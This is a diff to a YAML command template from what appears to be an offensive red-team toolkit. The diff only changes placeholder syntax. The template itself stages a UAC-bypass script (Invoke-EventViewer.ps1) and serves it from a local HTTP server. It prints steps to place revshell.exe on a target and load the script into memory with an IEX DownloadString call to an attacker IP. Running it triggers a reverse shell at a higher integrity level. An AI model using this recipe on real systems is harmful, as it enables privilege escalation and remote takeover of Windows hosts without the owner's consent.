@@ -6,12 +6,12 @@ metadata:
   author: "Unknown"
 
 content: |
-  mkdir -p packstation/outbound; cp -n <%=$(esh variables/tools_dir)%>/uacbypass/Invoke-EventViewer.ps1 packstation/outbound/; \
+  mkdir -p packstation/outbound; cp -n {{ tools_dir }}/uacbypass/Invoke-EventViewer.ps1 packstation/outbound/; \
   echo '================================================================'; \
   echo '                      -----PowerShell-----                      '; \
-  echo 'Preparation 1: Transfer a revshell.exe to the target (<%=$(esh variables/delivery_path_windows)%>\revshell.exe) and start the listener'; \
-  echo 'Deliver & Inject to memory: IEX (New-Object System.Net.Webclient).DownloadString(\'http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/Invoke-EventViewer.ps1\')'; \
-  echo 'Execute (It takes a few seconds to trigger the revshell): Invoke-EventViewer <%=$(esh variables/delivery_path_windows)%>\revshell.exe'; \
+  echo 'Preparation 1: Transfer a revshell.exe to the target ({{ delivery_path_windows }}\revshell.exe) and start the listener'; \
+  echo 'Deliver & Inject to memory: IEX (New-Object System.Net.Webclient).DownloadString(\'http://{{ attacker_ip }}:{{ delivery_outbound_port }}/Invoke-EventViewer.ps1\')'; \
+  echo 'Execute (It takes a few seconds to trigger the revshell): Invoke-EventViewer {{ delivery_path_windows }}\revshell.exe'; \
   echo 'NOTE: You should get a new revshell with a higher integrity level (but still the same user)'; \
   echo '================================================================'; \
-   python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
